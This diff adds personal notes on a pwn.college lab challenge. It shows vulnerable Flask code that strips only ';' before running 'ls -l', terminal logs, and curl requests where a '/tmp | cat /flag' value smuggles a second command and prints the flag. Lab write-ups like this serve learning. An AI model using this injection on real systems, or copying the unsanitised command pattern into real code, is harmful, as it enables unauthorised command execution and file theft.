@@ -1,0 +1,66 @@
+//command injection when only ";" is filtered 
+//😂 stupid people
+
+vulnerable code:
+def challenge():
+    arg = flask.request.args.get("folder", "/challenge").replace(";", "")
+    command = f"ls -l {arg}"
+
+
+Terminal 1:
+
+
+hacker@web-security~cmdi-2:~$ cd /challenge/
+hacker@web-security~cmdi-2:/challenge$ ls
+DESCRIPTION.md  server
+hacker@web-security~cmdi-2:/challenge$ /challenge/server
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+127.0.0.1 - - [27/Sep/2026 15:18:35] "GET /challenge?folder=/tmp HTTP/1.1" 404 -
+DEBUG: command='ls -l /tmp'
+127.0.0.1 - - [27/Sep/2026 15:19:16] "GET /checkpoint?folder=/tmp HTTP/1.1" 200 -
+DEBUG: command='ls -l /tmp | cat /flag'
+127.0.0.1 - - [27/Sep/2026 15:20:45] "GET /checkpoint?folder=/tmp%20|%20cat%20/flag HTTP/1.1" 200 -
+
+Terminal 2: curl the site 
+
+
+hacker@web-security~cmdi-2:/challenge$ curl http://challenge.localhost/challenge?folder=/tmp
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+hacker@web-security~cmdi-2:/challenge$ curl http://challenge.localhost/checkpoint?folder=/tmp
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/checkpoint"><input type=text name=folder><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l /tmp:</b><br>
+        <pre>total 12
+drwxr-xr-x 2 root  root  4096 Feb 23  2026 bin
+drwxr-xr-x 1 root  root  4096 Feb 23  2026 hsperfdata_root
+drwx------ 2 mysql mysql 4096 Feb 23  2026 tmp.hYVUanCOAv
+</pre>
+        </body></html>
+hacker@web-security~cmdi-2:/challenge$ curl http://challenge.localhost/checkpoint?folder=/tmp%20|%20cat /flag'
+> ^C
+hacker@web-security~cmdi-2:/challenge$ curl http://challenge.localhost/checkpoint?folder=/tmp%20|%20cat %20/flag'
+> ^C
+hacker@web-security~cmdi-2:/challenge$ curl 'http://challenge.localhost/checkpoint?folder=/tmp%20|%20cat %20/flag'
+curl: (3) URL rejected: Malformed input to a URL function
+hacker@web-security~cmdi-2:/challenge$ curl 'http://challenge.localhost/checkpoint?folder=/tmp%20|%20cat%20/flag'
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/checkpoint"><input type=text name=folder><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l /tmp | cat /flag:</b><br>
+        <pre>pwn.college{IQEER10bGEpyW-Lpx9-5YSdLumK.QX0YTN2wCN2cDOxIzW}
+</pre>
+        </body></html>
+hacker@web-security~cmdi-2:/challenge$ 
